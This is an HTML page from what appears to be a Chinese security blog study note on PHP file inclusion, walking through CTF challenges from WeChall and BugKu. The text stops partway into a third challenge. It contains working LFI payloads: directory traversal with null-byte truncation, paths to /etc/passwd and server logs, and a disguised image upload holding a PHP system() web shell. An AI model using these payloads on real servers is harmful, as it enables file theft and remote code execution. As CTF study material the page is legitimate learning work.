<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="baidu-site-verification" content="5ZQsOe30cm" />
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha256-HtsXJanqjKTc8vVQjO4YMhiqFoXkfBsjBWcX91T1jr8=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"southsea.st","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.17.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":"mac"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"disqusjs","storage":true,"lazyload":false,"nav":null,"activeClass":"disqusjs"},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"æœç´¢...","empty":"æ²¡æœ‰æ‰¾åˆ°ä»»ä½•æœç´¢ç»“æœï¼š${query}","hits_time":"æ‰¾åˆ° ${hits} ä¸ªæœç´¢ç»“æœï¼ˆç”¨æ—¶ ${time} æ¯«ç§’ï¼‰","hits":"æ‰¾åˆ° ${hits} ä¸ªæœç´¢ç»“æœ"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>

    <meta name="description" content="å‰è¨€ æœ¬å‘¨ä»»åŠ¡æ˜¯File Inclusionã€æ–‡ä»¶åŒ…å«ã€‚ æ–‡ä»¶åŒ…å«æ¼æ´ç®€å•æ¥è¯´å°±æ˜¯åœ¨ä½¿ç”¨å‡½æ•°åŒ…å«æ–‡ä»¶æ—¶ï¼Œæ²¡æœ‰å¯¹ä¼ å…¥çš„æ–‡ä»¶åè¿›è¡Œæœ‰æ•ˆçš„è¿‡æ»¤ï¼Œä»è€Œè¢«åˆ©ç”¨åŒ…å«äº†å…¶ä»–æ–‡ä»¶è¿›æ¥ï¼Œå¯¼è‡´æœåŠ¡å™¨ä¸Šæ–‡ä»¶ä¿¡æ¯çš„æ³„éœ²ç”šè‡³ä¼šè¢«æ³¨å…¥æ¶æ„ä»£ç ã€‚ æ–‡ä»¶åŒ…å«åˆ†ä¸ºLFIã€æœ¬åœ°æ–‡ä»¶åŒ…å«ä¸RFIã€è¿œç¨‹æ–‡ä»¶åŒ…å«ï¼Œå­—é¢æ„æ€ï¼Œå…¶ä¸­RFIéœ€è¦PHP_iniå¼€å¯url_allow_fopenå’Œurl_allow_includeã€‚">
<meta property="og:type" content="article">
<meta property="og:title" content="Webå®‰å…¨æ–‡ä»¶åŒ…å«ä¿®ç‚¼è®¡åˆ’">
<meta property="og:url" content="https://southsea.st/Study-File-Inclusion/index.html">
<meta property="og:site_name" content="å—æºŸNaN">
<meta property="og:description" content="å‰è¨€ æœ¬å‘¨ä»»åŠ¡æ˜¯File Inclusionã€æ–‡ä»¶åŒ…å«ã€‚ æ–‡ä»¶åŒ…å«æ¼æ´ç®€å•æ¥è¯´å°±æ˜¯åœ¨ä½¿ç”¨å‡½æ•°åŒ…å«æ–‡ä»¶æ—¶ï¼Œæ²¡æœ‰å¯¹ä¼ å…¥çš„æ–‡ä»¶åè¿›è¡Œæœ‰æ•ˆçš„è¿‡æ»¤ï¼Œä»è€Œè¢«åˆ©ç”¨åŒ…å«äº†å…¶ä»–æ–‡ä»¶è¿›æ¥ï¼Œå¯¼è‡´æœåŠ¡å™¨ä¸Šæ–‡ä»¶ä¿¡æ¯çš„æ³„éœ²ç”šè‡³ä¼šè¢«æ³¨å…¥æ¶æ„ä»£ç ã€‚ æ–‡ä»¶åŒ…å«åˆ†ä¸ºLFIã€æœ¬åœ°æ–‡ä»¶åŒ…å«ä¸RFIã€è¿œç¨‹æ–‡ä»¶åŒ…å«ï¼Œå­—é¢æ„æ€ï¼Œå…¶ä¸­RFIéœ€è¦PHP_iniå¼€å¯url_allow_fopenå’Œurl_allow_includeã€‚">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2018-08-01T00:00:00.000Z">
<meta property="article:modified_time" content="2025-01-24T03:34:53.073Z">
<meta property="article:author" content="å—æºŸNaN">
<meta property="article:tag" content="Web">
<meta property="article:tag" content="CTF">
<meta property="article:tag" content="æ–‡ä»¶åŒ…å«">
<meta property="article:tag" content="Webå®‰å…¨ä¿®ç‚¼è®¡åˆ’">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="https://southsea.st/Study-File-Inclusion/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://southsea.st/Study-File-Inclusion/","path":"Study-File-Inclusion/","title":"Webå®‰å…¨æ–‡ä»¶åŒ…å«ä¿®ç‚¼è®¡åˆ’"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>Webå®‰å…¨æ–‡ä»¶åŒ…å«ä¿®ç‚¼è®¡åˆ’ | å—æºŸNaN</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="åˆ‡æ¢å¯¼èˆªæ " role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">å—æºŸNaN</p>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">åœ¨è¿™æµ©ç€šæ˜Ÿæ²³çš„ä½ æ˜¯ä»€ä¹ˆ</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="æœç´¢" role="button">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>é¦–é¡µ</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>å…³äº</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>æ ‡ç­¾<span class="badge">24</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>åˆ†ç±»<span class="badge">5</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>å½’æ¡£<span class="badge">68</span></a></li><li class="menu-item menu-item-links"><a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>å‹é“¾</a></li><li class="menu-item menu-item-sitemap"><a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>ç«™ç‚¹åœ°å›¾</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>æœç´¢
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup"><div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" maxlength="80"
           placeholder="æœç´¢..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close" role="button">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="search-result-container no-result">
  <div class="search-result-icon">
    <i class="fa fa-spinner fa-pulse fa-5x"></i>
  </div>
</div>

    </div>
  </div>

</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          æ–‡ç« ç›®å½•
        </li>
        <li class="sidebar-nav-overview">
          ç«™ç‚¹æ¦‚è§ˆ
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">å‰è¨€</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B6%89%E5%8F%8A%E5%87%BD%E6%95%B0"><span class="nav-number">1.1.</span> <span class="nav-text">æ¶‰åŠå‡½æ•°</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#lfi%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="nav-number">2.</span> <span class="nav-text">LFIã€æœ¬åœ°æ–‡ä»¶åŒ…å«</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#x00-training-php-lfi"><span class="nav-number">2.1.</span> <span class="nav-text">0x00 Training:
PHP LFI</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%BF%99%E9%87%8C%E6%98%AF%E6%91%98%E6%8A%84%E7%9A%84%E7%AC%94%E8%AE%B0"><span class="nav-number">2.1.1.</span> <span class="nav-text">è¿™é‡Œæ˜¯æ‘˜æŠ„çš„ç¬”è®°</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#x01-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB2"><span class="nav-number">2.2.</span> <span class="nav-text">0x01 æ–‡ä»¶åŒ…å«2</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%BF%99%E9%87%8C%E6%98%AF%E6%91%98%E6%8A%84%E7%9A%84%E7%AC%94%E8%AE%B0-1"><span class="nav-number">2.2.1.</span> <span class="nav-text">è¿™é‡Œæ˜¯æ‘˜æŠ„çš„ç¬”è®°</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#x02-flag%E5%9C%A8index%E9%87%8C"><span class="nav-number">2.3.</span> <span class="nav-text">0x02 Flagåœ¨Indexé‡Œ</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%87%E6%BB%A4%E5%99%A8"><span class="nav-number">2.3.1.</span> <span class="nav-text">å­—ç¬¦ä¸²è¿‡æ»¤å™¨</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%BD%AC%E6%8D%A2%E8%BF%87%E6%BB%A4%E5%99%A8"><span class="nav-number">2.3.2.</span> <span class="nav-text">è½¬æ¢è¿‡æ»¤å™¨</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%8E%8B%E7%BC%A9%E8%BF%87%E6%BB%A4%E5%99%A8"><span class="nav-number">2.3.3.</span> <span class="nav-text">å‹ç¼©è¿‡æ»¤å™¨</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%8A%A0%E5%AF%86%E8%BF%87%E6%BB%A4%E5%99%A8"><span class="nav-number">2.3.4.</span> <span class="nav-text">åŠ å¯†è¿‡æ»¤å™¨</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#x03-welcome-to-bugkuctf"><span class="nav-number">2.4.</span> <span class="nav-text">0x03 welcome to bugkuctf</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#x04-level-3--double-agent"><span class="nav-number">2.5.</span> <span class="nav-text">0x04 Level 3- Double Agent</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#x05-%E5%88%A9%E7%94%A8procselfenviron"><span class="nav-number">2.6.</span> <span class="nav-text">0x05 åˆ©ç”¨&#x2F;proc&#x2F;self&#x2F;environ</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#x06-%E5%88%A9%E7%94%A8%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E6%B1%A1%E6%9F%93"><span class="nav-number">2.7.</span> <span class="nav-text">0x06 åˆ©ç”¨æ—¥å¿—æ–‡ä»¶æ±¡æŸ“</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#x07-%E5%8C%85%E5%90%ABsession%E6%96%87%E4%BB%B6"><span class="nav-number">2.8.</span> <span class="nav-text">0x07 åŒ…å«SESSIONæ–‡ä»¶</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#rfi%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="nav-number">3.</span> <span class="nav-text">RFIã€è¿œç¨‹æ–‡ä»¶åŒ…å«</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%BD%93allow_url_fopenon%E4%B8%8Eallow_url_includeon%E6%97%B6"><span class="nav-number">3.1.</span> <span class="nav-text">å½“allow_url_fopen&#x3D;Onä¸allow_url_include&#x3D;Onæ—¶</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%BD%93allow_url_fopenon%E4%B8%8Eallow_url_includeoff%E6%97%B6"><span class="nav-number">3.2.</span> <span class="nav-text">å½“allow_url_fopen&#x3D;Onä¸allow_url_include&#x3D;Offæ—¶</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%BD%93allow_url_fopenoff%E4%B8%8Eallow_url_includeon%E6%97%B6"><span class="nav-number">3.3.</span> <span class="nav-text">å½“allow_url_fopen&#x3D;Offä¸allow_url_include&#x3D;Onæ—¶</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%98%B2%E5%BE%A1%E6%96%B9%E6%B3%95"><span class="nav-number">4.</span> <span class="nav-text">é˜²å¾¡æ–¹æ³•</span></a></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="å—æºŸNaN"
      src="https://avatars.githubusercontent.com/u/34373144?v=4">
  <p class="site-author-name" itemprop="name">å—æºŸNaN</p>
  <div class="site-description" itemprop="description">åœ¨è¿™æµ©ç€šæ˜Ÿæ²³çš„ä½ æ˜¯ä»€ä¹ˆ</div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">68</span>
          <span class="site-state-item-name">æ—¥å¿—</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">5</span>
        <span class="site-state-item-name">åˆ†ç±»</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">24</span>
        <span class="site-state-item-name">æ ‡ç­¾</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author animated">
      <span class="links-of-author-item">
        <a href="https://github.com/southseast" title="GitHub â†’ https:&#x2F;&#x2F;github.com&#x2F;southseast" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:st.southsea@gmail.com" title="E-Mail â†’ mailto:st.southsea@gmail.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
  </div>

        </div>
      </div>
        <div class="back-to-top animated" role="button" aria-label="è¿”å›é¡¶éƒ¨">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://southsea.st/Study-File-Inclusion/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://avatars.githubusercontent.com/u/34373144?v=4">
      <meta itemprop="name" content="å—æºŸNaN">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="å—æºŸNaN">
      <meta itemprop="description" content="åœ¨è¿™æµ©ç€šæ˜Ÿæ²³çš„ä½ æ˜¯ä»€ä¹ˆ">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="Webå®‰å…¨æ–‡ä»¶åŒ…å«ä¿®ç‚¼è®¡åˆ’ | å—æºŸNaN">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          Webå®‰å…¨æ–‡ä»¶åŒ…å«ä¿®ç‚¼è®¡åˆ’
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">å‘è¡¨äº</span>

      <time title="åˆ›å»ºæ—¶é—´ï¼š2018-08-01 00:00:00" itemprop="dateCreated datePublished" datetime="2018-08-01T00:00:00+00:00">2018-08-01</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">åˆ†ç±»äº</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">å­¦ä¹ ç¬”è®°</span></a>
        </span>
    </span>

  
    <span class="post-meta-item" title="é˜…è¯»æ¬¡æ•°" id="busuanzi_container_page_pv">
      <span class="post-meta-item-icon">
        <i class="far fa-eye"></i>
      </span>
      <span class="post-meta-item-text">é˜…è¯»æ¬¡æ•°ï¼š</span>
      <span id="busuanzi_value_page_pv"></span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody"><h3 id="å‰è¨€">å‰è¨€</h3>
<p>æœ¬å‘¨ä»»åŠ¡æ˜¯<strong>File Inclusion</strong>ã€æ–‡ä»¶åŒ…å«ã€‚</p>
<p>æ–‡ä»¶åŒ…å«æ¼æ´ç®€å•æ¥è¯´å°±æ˜¯åœ¨ä½¿ç”¨å‡½æ•°åŒ…å«æ–‡ä»¶æ—¶ï¼Œæ²¡æœ‰å¯¹ä¼ å…¥çš„æ–‡ä»¶åè¿›è¡Œæœ‰æ•ˆçš„è¿‡æ»¤ï¼Œä»è€Œè¢«åˆ©ç”¨åŒ…å«äº†å…¶ä»–æ–‡ä»¶è¿›æ¥ï¼Œå¯¼è‡´æœåŠ¡å™¨ä¸Šæ–‡ä»¶ä¿¡æ¯çš„æ³„éœ²ç”šè‡³ä¼šè¢«æ³¨å…¥æ¶æ„ä»£ç ã€‚</p>
<p>æ–‡ä»¶åŒ…å«åˆ†ä¸º<strong>LFI</strong>ã€æœ¬åœ°æ–‡ä»¶åŒ…å«ä¸<strong>RFI</strong>ã€è¿œç¨‹æ–‡ä»¶åŒ…å«ï¼Œå­—é¢æ„æ€ï¼Œå…¶ä¸­<strong>RFI</strong>éœ€è¦<strong>PHP_ini</strong>å¼€å¯<strong>url_allow_fopen</strong>å’Œ<strong>url_allow_include</strong>ã€‚</p>
<span id="more"></span>
<h4 id="æ¶‰åŠå‡½æ•°">æ¶‰åŠå‡½æ•°</h4>
<p><strong>include()</strong>ï¼Œ<strong>require()</strong>ï¼šä¼šè·å–æŒ‡å®šæ–‡ä»¶ä¸­å­˜åœ¨çš„æ‰€æœ‰æ–‡æœ¬/ä»£ç /æ ‡è®°ï¼Œå¹¶å¤åˆ¶åˆ°ä½¿ç”¨<strong>include</strong>è¯­å¥çš„æ–‡ä»¶ä¸­ã€‚</p>
<p><strong>include_once()</strong>ï¼Œ<strong>require_once()</strong>ï¼šå…ˆéªŒè¯æ˜¯å¦å·²ç»åŒ…å«äº†æ–‡ä»¶ï¼Œå¦‚æœå·²ç»åŒ…å«äº†ï¼Œå°±ä¸å†æ‰§è¡Œã€‚</p>
<p><strong>include()</strong>
ï¼Œ<strong>include_once()</strong>ï¼šåŒ…å«æ–‡ä»¶æ—¶å³ä½¿é‡åˆ°é”™è¯¯ï¼Œä¸‹é¢ä»£ç ä¼šä¾ç„¶æ‰§è¡Œã€‚</p>
<p><strong>require()</strong>
ï¼Œ<strong>require_once()</strong>ï¼šåŒ…å«æ–‡ä»¶æ—¶é‡åˆ°é”™è¯¯ï¼Œç›´æ¥æŠ¥é”™é€€å‡ºç¨‹åºã€‚</p>
<h3 id="lfiæœ¬åœ°æ–‡ä»¶åŒ…å«">LFIã€æœ¬åœ°æ–‡ä»¶åŒ…å«</h3>
<p><strong>LFI</strong>å¤§å¤šå‡ºç°åœ¨æ¨¡å—åŠ è½½ã€æ¨¡æ¿åŠ è½½å’Œ<strong>cache</strong>è°ƒç”¨è¿™äº›åœ°æ–¹ï¼Œæœ‰å¤šé‡åˆ©ç”¨æ–¹å¼ã€‚</p>
<h4 id="x00-training-php-lfi">0x00 <a
target="_blank" rel="noopener" href="http://www.wechall.net/challenge/training/php/lfi/up/index.php">Training:
PHP LFI</a></h4>
<p><strong>WeChall</strong>çš„ä¸€é“é¢˜ï¼Œæºç å¦‚ä¸‹ã€‚</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$filename</span> = <span class="string">&#x27;pages/&#x27;</span>.(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>])?<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>]:<span class="string">&quot;welcome&quot;</span>).<span class="string">&#x27;.html&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="variable">$filename</span>;</span><br></pre></td></tr></table></figure>
<p>é¢˜ç›®è¦æ±‚åŒ…å«<strong>solution.php</strong>ã€‚</p>
<p>é™„ä¸Š<strong>payload</strong>ä¸º<strong>?file=../../solution.php%00</strong>ã€‚</p>
<p>æ­¤å¤„æ— è¿‡æ»¤ï¼Œä»…ä»…ä½¿ç”¨äº†ä¸€ä¸ªæ‹¼æ¥çš„<strong>.</strong>ï¼Œå› æ­¤ä½¿ç”¨<strong>%00</strong>æˆªæ–­æ¥æ³¨é‡Šæ‰åé¢çš„<strong>html</strong>ã€‚</p>
<p>è¿™ç§ç®€å•çš„æ–‡ä»¶åŒ…å«éœ€è¦æ»¡è¶³çš„æ¡ä»¶æœ‰<strong>magic_quotes_gpc=off</strong>ä¸”å°äºç‰ˆæœ¬<strong>5.3.4</strong>
ã€‚</p>
<p>å¹¶ä¸”å¾ˆé‡è¦çš„ä¸€ç‚¹æ˜¯è¦æœ‰<strong>æƒé™</strong>ã€‚</p>
<h5 id="è¿™é‡Œæ˜¯æ‘˜æŠ„çš„ç¬”è®°"><a
target="_blank" rel="noopener" href="https://lalajun.github.io/2018/03/19/WEB-LFI%E4%B8%8ERFI%E5%88%A9%E7%94%A8/">è¿™é‡Œæ˜¯æ‘˜æŠ„çš„ç¬”è®°</a></h5>
<p>è®°ä¸€ä¸‹ä¸€äº›å…³é”®æ–‡ä»¶ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">../../../../../../../etc/passwd(æ“ä½œç³»ç»Ÿç”¨æˆ·ä¿¡æ¯,è¯¥æ–‡ä»¶ä¸ºæ‰€æœ‰ç”¨æˆ·å¯è§)</span><br><span class="line">../../../../../proc/self/environ(procç›®å½•)</span><br><span class="line">../../../../../../var/log/apache2/access.log(apacheæ—¥å¿—ï¼Œéœ€è¦åŒ…æ‹¬æ‰€æœ‰ä¸Šçº§ç›®å½•è®¿é—®æƒé™)</span><br><span class="line"></span><br><span class="line">è¿˜æœ‰å…¶ä»–é…ç½®æ–‡ä»¶(WebæœåŠ¡å™¨é…ç½®æ–‡ä»¶,Webæ—¥å¿—)</span><br></pre></td></tr></table></figure>
<p>åŒæ—¶è¿˜æœ‰ä¸¤ç§æˆªæ–­ï¼Œä¸€ä¸ªæ˜¯<strong>Windows</strong>ä¸‹é•¿äº<strong>256</strong>ä¼šè¢«æˆªæ–­ï¼Œä¸€æ˜¯<strong>Linux</strong>
ä¸‹é•¿äº<strong>4096</strong>ä¼šè¢«æˆªæ–­ã€‚</p>
<h4 id="x01-æ–‡ä»¶åŒ…å«2">0x01 <a
target="_blank" rel="noopener" href="http://118.89.219.210:49166/index.php?file=hello.php">æ–‡ä»¶åŒ…å«2</a></h4>
<p>æºä»£ç å‘ç°æœ‰ä¸€ä¸ª<strong>upload.php</strong>ã€‚</p>
<p>ç‚¹å¼€åæ˜¯ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ <strong>+</strong>æ–‡ä»¶åŒ…å«çš„ç»„åˆã€‚</p>
<p>ç”±äº<strong>include</strong>å‡½æ•°åŒ…å«çš„æ–‡ä»¶ä¼šç›´æ¥å°†å…¶å½“åšPHPè§£æï¼Œæ‰€ä»¥æ‰€æœ‰çš„<strong>.txt,.jpg,.gif</strong>æ–‡ä»¶ä¸­åŒ…å«ä¸€å¥è¯å°±å¯ä»¥ç›´æ¥èœåˆ€è¿æ¥ã€‚</p>
<p>å› æ­¤æ­¤å¤„åªéœ€è¦å°†ä¸€å¥è¯åç¼€ä¿®æ”¹ä¸Šä¼ å†ä½¿ç”¨æ–‡ä»¶åŒ…å«è¿›è¡Œèœåˆ€è¿æ¥å°±è¡Œã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://118.89.219.210:49166/index.php?file=upload/201808070803369644.jpg</span><br></pre></td></tr></table></figure>
<p>ä½†æ˜¯è¿ä¸ä¸ŠğŸï¼Œåº”å½“æ˜¯è¿›è¡Œäº†è¿‡æ»¤ã€‚</p>
<p>ç„¶åçœ‹é¢˜è§£æ‰çŸ¥é“è¿˜èƒ½æ„é€ å¦‚ä¸‹ä»£ç ä¸Šä¼ ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=php&gt;system(&quot;ls&quot;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>è®¿é—®é‡å‘½ååçš„è¿æ¥å¯ä»¥çœ‹åˆ°è¿™è¡Œä»£ç è¢«æˆåŠŸæ‰§è¡Œäº†ã€‚</p>
<p>æ˜¾ç¤º<strong>about hello.php index.php
this_is_th3_F14g_154f65sd4g35f4d6f43.txt upload
upload.php</strong>ã€‚</p>
<p>é‚£ä¹ˆå°±èƒ½å¾—åˆ°äº†<strong>SKCTF{uP104D_1nclud3_426fh8_is_Fun}</strong>
ã€‚</p>
<h5 id="è¿™é‡Œæ˜¯æ‘˜æŠ„çš„ç¬”è®°-1"><a
target="_blank" rel="noopener" href="http://php.net/manual/zh/language.basic-syntax.phpmode.php">è¿™é‡Œæ˜¯æ‘˜æŠ„çš„ç¬”è®°</a></h5>
<p><strong>PHP</strong>çš„å¼€å§‹å’Œç»“æŸçš„æ ‡è®°ä¸€å…±æœ‰å››ç§ã€‚</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span></span><br><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt; <span class="title function_ invoke__">phpinfo</span>();&lt;/script&gt;</span><br><span class="line"><span class="meta">&lt;?</span> <span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span></span><br><span class="line">&lt;% <span class="title function_ invoke__">phpinfo</span>();%&gt;</span><br></pre></td></tr></table></figure>
<p>æ­¤å¤„ä¾‹1å’Œä¾‹2éƒ½æ˜¯å¯ç”¨ï¼Œè€Œä¾‹3éœ€è¦åœ¨<strong>PHP.ini</strong>ä¸­æ‰“å¼€<strong>short-open-tag</strong>ï¼Œä½†å®ƒåœ¨PHP5.4ä¹‹åå°±æ€»æ˜¯å¯ç”¨äº†æ— éœ€å¯ç”¨å†<strong>short-open-tag</strong>ï¼Œä¾‹4éœ€è¦å¯ç”¨çš„æ˜¯<strong>asp-tags</strong>ã€‚</p>
<h4 id="x02-flagåœ¨indexé‡Œ">0x02 <a
target="_blank" rel="noopener" href="http://120.24.86.145:8005/post/">Flagåœ¨Indexé‡Œ</a></h4>
<p><strong>BugKu</strong>çš„ä¸€é“é¢˜ã€‚</p>
